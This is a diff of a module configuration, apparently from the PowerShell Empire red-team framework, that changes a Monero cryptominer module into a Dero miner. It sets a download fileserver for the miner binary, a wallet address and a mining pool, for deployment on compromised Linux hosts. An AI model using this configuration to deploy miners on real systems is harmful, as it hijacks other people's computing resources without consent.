@@ -1,9 +1,9 @@
-name: XMR Cryptominer
+name: Derohe Cryptominer
 authors:
   - name: 0x636f646f
     handle: '@BuildAndDestroy'
     link: https://github.com/BuildAndDestroy
-description: Deploys a monero miner
+description: Deploys a derohe miner
 software: ''
 techniques:
   - T1496
@@ -23,17 +23,17 @@ options:
   - name: Fileserver
     description: Full URL and directory path for the fileserver we will download xmrig in base64
     required: true
-    value: 'https://fileshare.yourdomain.com/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv/'
+    value: 'https://fileshare.yourdomain.com/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl/'
   - name: Wallet
     description: Your monero wallet address
     required: true
-    value: '443iMnW1EnzKkoqQwJH3sUcEMbgKMcvnd5EG8uuECWNriNfgQwmdXCsBseht9cGyoj19ZSqhkvW3DW5kGFFWmmrN989jGJf'
+    value: 'dero1qytrrg0qxdy4tgc0wcunxuhkpwnza6h3vh305tx56mm00rd4xevd7qq5wa9q2'
   - name: FileNumber
     description: Last file number to download
     required: true
-    value: 10
+    value: 12
   - name: MiningPool
     description: mining pool to connect our miner
     required: true
-    value: 'xmr-us-west1.nanopool.org:14433'
-script_path: '/usr/share/powershell-empire/empire/server/data/module_source/python/impact/linux/xmr_miner.py'
+    value: 'minernode1.dero.live:10100'
+script_path: '/usr/share/powershell-empire/empire/server/data/module_source/python/impact/linux/derohe_miner.py'
